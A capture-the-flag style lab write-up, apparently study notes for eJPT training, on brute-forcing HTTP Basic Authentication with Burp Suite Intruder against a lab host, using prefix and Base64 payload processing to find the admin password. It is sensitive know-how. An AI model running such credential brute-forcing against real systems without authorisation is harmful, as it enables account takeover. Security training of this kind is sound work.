## What is this lab about?
A hands-on lab demonstrating **HTTP Basic Authentication brute-forcing** using Burp Suite Intruder. Covers intercepting Basic Auth requests, decoding Base64 credentials, configuring Intruder with payload processing (prefix + Base64 encoding), and identifying valid credentials via status codes.

---

## Key Concepts Explained

**HTTP Basic Authentication**
- Browser pops up native login dialog (not HTML form).
- Credentials sent as `Authorization: Basic <base64>` header.
- Format: `username:password` → Base64 encoded.
- Example: `admin:password` → `YWRtaW46cGFzc3dvcmQ=`

**Base64 Encoding**
- Used to encode binary data as ASCII text.
- Basic Auth uses Base64 for credential transmission.
- **Not encryption** — easily decoded.

**Burp Suite Intruder Payload Processing**
- **Prefix**: Add static text before each payload (e.g., `admin:`).
- **Base64 Encode**: Encode the combined string before sending.
- Allows brute-forcing when username is known.

## Commands & Workflow

### Step 1 — Environment Setup
```bash
# Check Kali IP and identify target
ip addr show
nmap -sV 192.107.115.3
# Result: HTTP server on port 80
```

### Step 2 — Discover Basic Auth
```bash
# Navigate to: http://192.107.115.3/basic/
# Browser shows native login dialog:
# Username: [test]
# Password: [test]
# Result: "Cancel" or wrong credentials = 401 Unauthorized
```

### Step 3 — Intercept with Burp Suite
```bash
# 1. Enable Burp proxy, FoxyProxy ON
# 2. Navigate to /basic/
# 3. Enter test/test in dialog
# 4. Burp intercepts GET request:

GET /basic/ HTTP/1.1
Host: 192.107.115.3
Authorization: Basic dGVzdDp0ZXN0
Cookie: PHPSESSID=...
```

### Step 4 — Decode Authorization Header
```bash
# In Burp: Right-click header → Convert Selection → Base64 Decode
# Result: dGVzdDp0ZXN0 → test:test

# Format confirmed: username:password → Base64 encoded
```

### Step 5 — Configure Intruder
```bash
# 1. Send request to Intruder (Ctrl+I)
# 2. Positions tab:
#    - Clear all default § markers
#    - Highlight Base64 value: dGVzdDp0ZXN0
#    - Click "Add §" → §dGVzdDp0ZXN0§

# 3. Attack type: Sniper (single payload position)
```

### Step 6 — Payload Configuration
```bash
# Payloads tab:
# Payload set: 1
# Payload type: Simple list

# Load wordlist:
# /root/Desktop/100-most-common-passwords.txt

# Payload Processing:
# 1. Add → Prefix: admin:
#    # Result: admin:password123
# 2. Add → Encode → Base64
#    # Result: YWRtaW46cGFzc3dvcmQxMjM=
```

### Step 7 — Launch Attack
```bash
# Click "Start attack"
# Community Edition: Throttled (slow)
# Pro Edition: Full speed

# Monitor status codes:
# - 401 Unauthorized = Wrong password
# - 200 OK / 301 Redirect = Valid credentials!
```

### Step 8 — Identify Success
```bash
# Sort results by Status column
# Look for 200 OK or 301 Redirect

# Example successful result:
# Payload: YWRtaW46Y29va2llMQ==
# Status: 301 (Redirect)
# Length: Different from 401 responses

# Decode successful payload:
# YWRtaW46Y29va2llMQ== → admin:cookie1
```

### Step 9 — Manual Verification
```bash
# In browser: http://192.107.115.3/basic/
# Username: admin
# Password: cookie1
# Result: Logged in! Flag displayed.
```

## Key Takeaways

| Aspect | Detail |
|---|---|
| **Auth type** | HTTP Basic Authentication (not form-based) |
| **Encoding** | Base64 (`username:password`) |
| **Username** | Known: `admin` |
| **Password** | Found: `cookie1` |
| **Success indicator** | Status 301 (redirect) instead of 401 |
| **Flag** | Displayed after successful login |

- **Basic Auth ≠ Form Auth** — Hydra's `http-post-form` won't work here; need `http-get` with Basic Auth or Burp Intruder.
- **Base64 is not encryption** — easily decoded; never rely on it for security.
- **Payload processing order matters** — Prefix first, then Base64 encode the combined string.
- **Status code analysis** — 401 = fail, 200/301 = success; sort by Status in Intruder.
- **URL encoding trap** — `%3D` = `=`; decode URL first, then Base64.
- **eJPT relevance**: Understanding auth mechanisms and brute-force tools is tested; Burp Intruder specifics are more eWPT-level.
